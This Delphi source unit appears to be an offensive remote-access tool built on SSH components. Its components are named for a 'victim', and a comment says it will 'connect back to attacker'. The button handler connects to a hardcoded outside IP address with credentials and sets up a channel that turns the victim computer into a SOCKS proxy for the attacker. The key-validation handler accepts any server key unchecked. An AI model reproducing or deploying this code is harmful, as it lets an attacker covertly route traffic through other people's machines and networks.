unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, ScSSHClient, ScSSHChannel,
  ScBridge, ScSSHServer, Vcl.Samples.Spin, Vcl.ExtCtrls, ScUtils, ScSSHUtils;

type
  TForm1 = class(TForm)
    Memo1: TMemo;
    Victimsshclient: TScSSHClient;
    VICTIMSSHCHANNEL: TScSSHChannel;
    ScMemoryStorage1: TScMemoryStorage;
    Button1: TButton;
    procedure Button1Click(Sender: TObject);
    procedure VictimsshclientServerKeyValidate(Sender: TObject;
      NewServerKey: TScKey; var Accept: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
begin
  try
    // Connect back to attacker
    Victimsshclient.HostName := '167.224.235.47';
    Victimsshclient.Port := 3434;
    Victimsshclient.User := 'user';
    Victimsshclient.Password := 'pass';
    Victimsshclient.Connect;

    // Now request forwarding this Computers Internet as a proxy back through The SSH server...
    VICTIMSSHCHANNEL.GatewayPorts := True;
    VICTIMSSHCHANNEL.Remote := False; // Must be False for Dynamic SOCKS
    VICTIMSSHCHANNEL.Dynamic := True; // Enable SOCKS proxy mode
    VICTIMSSHCHANNEL.SourcePort := 5933;
    VICTIMSSHCHANNEL.DestHost := ''; // Not needed for dynamic SOCKS
    VICTIMSSHCHANNEL.DestPort := 0; // Not needed for dynamic SOCKS
    VICTIMSSHCHANNEL.Connect;
  except
    on E: Exception do
      Memo1.Lines.Add('Error: ' + E.Message);
  end;
end;

procedure TForm1.VictimsshclientServerKeyValidate(Sender: TObject;
  NewServerKey: TScKey; var Accept: Boolean);
begin
  // Just accept whatever KEY Cert the server serves us...
  Accept := True;
end;

end.
